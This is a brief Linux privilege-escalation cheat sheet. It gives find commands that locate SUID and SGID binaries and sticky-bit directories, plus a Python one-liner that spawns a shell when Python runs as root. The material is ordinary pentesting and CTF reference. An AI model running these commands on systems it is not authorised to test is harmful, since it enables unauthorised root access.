# 🐧 Privilege escalation: Linux

### **Linux:**

Find Binaries that will execute as the owner

* ```
  find / -perm -u=s -type f 2>/dev/null
  ```

Find binaries that will execute as the group

* ```
  find / -perm -g=s -type f 2>/dev/null
  ```

Find sticky-bit binaries

* ```
  find / -perm -1000 -type d 2>/dev/null
  ```

If Python is executable as root

* ```
  python2.7 -c "import pty;pty.spawn('/bin/sh');"
  ```
